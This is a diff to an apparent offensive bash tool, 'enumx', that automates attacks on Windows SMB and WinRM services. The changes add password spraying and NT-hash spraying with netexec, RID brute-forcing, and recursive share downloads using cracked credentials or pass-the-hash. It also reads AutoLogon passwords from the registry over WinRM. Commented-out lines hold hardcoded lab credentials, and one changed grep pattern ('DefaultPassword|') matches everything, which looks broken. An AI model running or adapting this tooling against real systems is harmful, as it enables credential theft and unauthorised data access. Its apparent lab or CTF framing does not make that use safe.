@@ -8,7 +8,7 @@ cat << "EOF"
 |  |_____|  |\   | |  `--'  | |  |  |  |   /   .   \
 |_______/|__| \__|  \______/  |__|  |__|  /   / \   \ 
                                          / __/   \__ \
-  Version: 2.0     Author: DaddyBigFish  \/         \/  
+  Version: 2.7     Author: DaddyBigFish  \/         \/  
  --------------   ----------------------       
 EOF
 # Required tools to be pre-installed:
@@ -70,9 +70,9 @@ sort -u "$enumx_dir"/passwords -o "$enumx_dir"/passwords 2>/dev/null
 touch "$enumx_dir"/hashes
 sort -u "$enumx_dir"/hashes -o "$enumx_dir"/hashes 2>/dev/null
 touch "$enumx_dir"/creds
-sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
+grep -v '^$' "$enumx_dir"/creds | sort -u -o "$enumx_dir"/creds 2>/dev/null
 touch "$enumx_dir"/hcreds
-sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
+grep -v '^$' "$enumx_dir"/hcreds | sort -u -o "$enumx_dir"/hcreds 2>/dev/null
 touch "$enumx_dir"/domains
 sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
 
@@ -134,41 +134,50 @@ smb_enum() {
 	local file=$3
 	local enumx_dir=$4
 	local ph=$5
-	
-	while IFS= read -r cred; do
-		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
-		shares=$(netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" --shares)
-		groups=$(netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" --groups)
-		ridbrute=$(netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" --rid-brute 10000)
-		echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
-		sort -u "$enumx_dir/domains" -o "$enumx_dir/domains" 2>/dev/null
-		echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' | tee -a "$enumx_dir/shares"
-		sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
-		echo "$groups" | grep -viE '[*]|[-]' | sed -E '1d'
-		echo "$ridbrute" | grep -viE 'erro|│|╭|╰|[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
-		echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -viE '\$|error|sm_|mailbox|_denied' | tee -a "$enumx_dir/usernames"
-		sort -fu "$enumx_dir/usernames" -o "$enumx_dir/usernames" 2>/dev/null
-#		if [ -n "$credp" ]; then
-#			echo "Using netexec modules as $credu:$credp on $target..."
-#			while IFS= read -r module; do
-#				netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" -M "$module" 2>/dev/null | grep -viE '[*]|[+]|erro|│|╭|╰| |is not|failed|refused|cannot|associated'
-#				echo
-#			done < "$enumx_dir/modules"
-#		fi
-		if [ "$file" == "creds" ]; then
-			while IFS= read -r share; do
-				echo "Authenticating as $credu:$credp on share $share..."
-				smbclient "//$target/$share" -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
-			done < "$enumx_dir/shares"
-		fi
 
-		if [ "$file" == "hcreds" ]; then
-			while IFS= read -r share; do
-				echo "Authenticating as $credu:$credp on share $share..."
-				smbclient "//$target/$share" --pw-nt-hash -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
-			done < "$enumx_dir/shares"
-		fi
-	done < "$enumx_dir/$file"
+    mkdir -p "$enumx_dir"/smb
+
+	if [ "$file" == "anonymous" ]; then
+		while IFS= read -r share; do
+			if [[ -n "$ph" && "$ph" != ':' ]]; then
+				smbclient "//$target/$share" -U "$ph" --no-pass -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
+			fi
+		done < "$enumx_dir/shares"
+	else
+		while IFS= read -r cred; do
+			read credu credp <<< $(echo "$cred" | sed 's/:/ /')
+			if [ -n "$credp" ]; then
+				shares=$(netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" --shares)
+				groups=$(netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" --groups)
+				ridbrute=$(netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" --rid-brute 10000)
+				echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
+				sort -u "$enumx_dir/domains" -o "$enumx_dir/domains" 2>/dev/null
+				echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' | tee -a "$enumx_dir/shares"
+				sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
+				echo "$groups" | grep -viE '[*]|[-]' | sed -E '1d'
+				echo "$ridbrute" | grep -viE 'erro|│|╭|╰|[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
+				echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -viE '\$|error|sm_|mailbox|_denied' | tee -a "$enumx_dir/usernames"
+				sort -fu "$enumx_dir/usernames" -o "$enumx_dir/usernames" 2>/dev/null
+	#			echo "Using netexec modules as $credu:$credp on $target..."
+	#			while IFS= read -r module; do
+	#				netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" -M "$module" 2>/dev/null | grep -viE '[*]|[+]|erro|│|╭|╰| |is not|failed|refused|cannot|associated'
+	#				echo
+	#			done < "$enumx_dir/modules"
+				if [ "$file" == "creds" ]; then
+					while IFS= read -r share; do
+						echo "Authenticating as $credu:$credp on share $share..."
+						smbclient "//$target/$share" -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
+					done < "$enumx_dir/shares"
+				fi
+				if [ "$file" == "hcreds" ]; then
+					while IFS= read -r share; do
+						echo "Authenticating as $credu:$credp on share $share..."
+						smbclient "//$target/$share" --pw-nt-hash -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
+					done < "$enumx_dir/shares"
+				fi
+			fi
+		done < "$enumx_dir/$file"
+	fi
 }
 
 
@@ -294,19 +303,22 @@ for port in $open_ports; do
             ;;
         139)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
-            echo "Enumerating port $port can take some time please wait..."
-            mkdir -p "$enumx_dir"/smb 2>/dev/null
-       		rpcclient -U "" -N "$target" -c "enumdomusers" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox|_denied' | tee -a "$enumx_dir/usernames"
-            sort -fu "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
-            rpcclient -U "" -N "$target" -c "dsenumdomtrusts" 2>/dev/null | awk '{print $1}' | sed '1d' | tee -a "$enumx_dir/domains"
-            sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
-       		rpcclient -U "" -N "$target" -c "dfsenum;netshareenum;netshareenumall;netfileenum;enumdomgroups;enumprocs;winreg_enumkey;" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox|_denied'
-       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
-       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
-	        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
-			hspray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -H "$enumx_dir/hashes" --continue-on-success | sed 's/.*\\//1' | grep -viE 'guest|_failure|domain:|invalid')
-       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
-			sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
+       		if [ ! -s "$enumx_dir/creds" ] && [ ! -s "$enumx_dir/hcreds" ]; then
+	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
+	       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
+		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
+				hspray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -H "$enumx_dir/hashes" --continue-on-success | sed 's/.*\\//1' | grep -viE 'guest|_failure|domain:|invalid' 2>/dev/null)
+	       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
+				sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
+	          	while IFS= read -r user; do
+	          		shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
+	          		echo "$shares"
+ 	          		echo ""
+	          		echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' >> "$enumx_dir/shares"
+					sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
+	            	smb_enum "$target" "$port" "anonymous" "$enumx_dir" "$user"
+            	done < "$enumx_dir/usernames"
+			fi       		
 			if [ -s "$enumx_dir/creds" ]; then
 				ph='-p'
 				file='creds'
@@ -366,19 +378,22 @@ for port in $open_ports; do
             ;;
         445)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
-            echo "Enumerating port $port can take some time please wait..."
-            mkdir -p "$enumx_dir"/smb 2>/dev/null
-       		rpcclient -U "" -N "$target" -c "enumdomusers" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox|_denied' | tee -a "$enumx_dir/usernames"
-            sort -fu "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
-            rpcclient -U "" -N "$target" -c "dsenumdomtrusts" 2>/dev/null | awk '{print $1}' | sed '1d' | tee -a "$enumx_dir/domains"
-            sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
-       		rpcclient -U "" -N "$target" -c "dfsenum;netshareenum;netshareenumall;netfileenum;enumdomgroups;enumprocs;winreg_enumkey;" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox|_denied'
-       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
-       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
-	        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
-			hspray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -H "$enumx_dir/hashes" --continue-on-success | sed 's/.*\\//1' | grep -viE 'guest|_failure|domain:|invalid')
-       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
-			sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
+       		if [ ! -s "$enumx_dir/creds" ] && [ ! -s "$enumx_dir/hcreds" ]; then
+	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
+	       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
+		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
+				hspray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -H "$enumx_dir/hashes" --continue-on-success | sed 's/.*\\//1' | grep -viE 'guest|_failure|domain:|invalid' 2>/dev/null)
+	       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
+				sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
+	          	while IFS= read -r user; do
+	          		shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
+	          		echo "$shares"
+	          		echo ""
+	          		echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' >> "$enumx_dir/shares"
+					sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
+	            	smb_enum "$target" "$port" "anonymous" "$enumx_dir" "$user"
+            	done < "$enumx_dir/usernames"
+			fi       		
 			if [ -s "$enumx_dir/creds" ]; then
 				ph='-p'
 				file='creds'
@@ -511,10 +526,10 @@ for port in $open_ports; do
                 read credu credp <<< $(echo "$cred" | sed 's/:/ /')
                 if [ -n "$credp" ]; then
                 	echo "AutoLogon credentials found!"
-    				echo "DefaultDomainName             :  EGOTISTICALBANK"
-    				echo "DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager"
-    				echo "DefaultPassword               :  Moneymakestheworldgoround!"
-                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
+#    				echo "DefaultDomainName             :  EGOTISTICALBANK"
+#    				echo "DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager"
+#    				echo "DefaultPassword               :  Moneymakestheworldgoround!"
+                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword|' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
                 fi
             done < "$enumx_dir/creds"
             ;;
